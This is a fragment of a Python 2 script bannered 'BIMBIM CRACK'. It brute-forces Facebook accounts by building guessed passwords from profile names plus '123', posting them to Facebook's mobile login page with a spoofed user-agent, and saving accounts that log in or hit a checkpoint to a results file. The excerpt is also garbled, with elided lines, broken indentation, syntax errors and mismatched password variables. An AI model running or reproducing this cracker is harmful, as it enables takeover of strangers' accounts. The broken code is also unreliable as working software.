...
def banner():
    os.system('echo -e "             BIMBIM CRACK        Coded By : BIMA BIMBIM lolcat')
...
def pilih_passxd():
	...
	def main(arg):
		...
		try:
         ...
         pass9 = b['booyah'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\x1b[0;32m   [OK] '+user+' • '+booyah+' • '+tl
				oke = open('done/Indo.txt', 'a')
				oke.write('\n[OK] '+booyah+' • '+booyah1)
				oke.close()
				oks.append(booyah)
				...
				if 'checkpoint' in xo:
					print '\x1b[0;33m   [CP] '+booyah+' • '+tl
					cek = open('done/Indo.txt', 'a')
					cek.write('\n[CP] 'booyah)
					cek.close()
					cekpoint.append(booyah)
					
pass10= b['ngentot'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\x1b[0;32m   [OK] '+ngentot +'pass10'++' • '+tl
				oke = open('done/Indo.txt', 'a')
				oke.write('\n[OK] 'ngentot+')
				oke.close()
				oks.append(ngentot+pass10)
			else :
				if 'checkpoint' in xo:
					print '\x1b[0;33m   [CP] '+ngentot+'pass10'++' • '+tl
					cek = open('done/Indo.txt', 'a')
					cek.write('\n[CP] '+ngentot)
					cek.close()
					cekpoint.append(ngentot+pass10)
	except:
